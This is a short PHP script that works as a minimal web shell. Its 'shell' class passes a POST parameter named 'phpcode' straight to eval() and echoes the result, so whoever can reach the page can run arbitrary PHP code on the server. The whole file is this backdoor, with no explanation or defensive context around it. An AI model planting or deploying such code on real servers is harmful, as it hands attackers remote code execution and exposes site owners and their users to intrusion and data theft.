<?php
class shell{
	function execute()
	{
		echo "<hr>";
		echo "<pre>";
		eval(stripslashes($_POST['phpcode']));
		echo "</pre>";
		echo "<hr>";
	}
}

$sh = new shell();
$sh->execute();
?>